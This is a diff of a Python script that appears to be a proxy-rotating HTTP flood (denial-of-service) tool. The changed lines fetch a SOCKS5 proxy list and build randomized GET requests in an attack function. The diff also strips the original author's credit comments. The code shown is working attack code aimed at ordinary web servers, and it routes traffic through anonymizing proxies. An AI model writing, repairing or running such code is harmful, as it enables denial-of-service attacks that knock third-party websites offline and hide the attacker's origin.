@@ -27,7 +27,7 @@ def opth():
 		print('Threads ' + str(g+1) + " Created ")
 
 def clone():
-	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=1000') #Code By GogoZin
+	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=9999')
 	with open('socks5.txt','wb') as f:
 		f.write(r.content)
 		print('[✓] Sucess Get List !')
@@ -77,7 +77,7 @@ def main():
 
 def atk():
 	ua = random.choice(useragent)
-	request = "GET " + uu + "?=" + str(random.randint(1,100)) + " HTTP/1.1\r\nHost: " + url + "\r\nUser-Agent: "+ua+"\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n" #Code By GogoZin
+	request = "GET " + uu + "?=" + str(random.randint(1,100)) + " HTTP/1.1\r\nHost: " + url + "\r\nUser-Agent: "+ua+"\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n" 
 	proxy = random.choice(lsts).strip().split(":")
 	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]))
 	time.sleep(5)
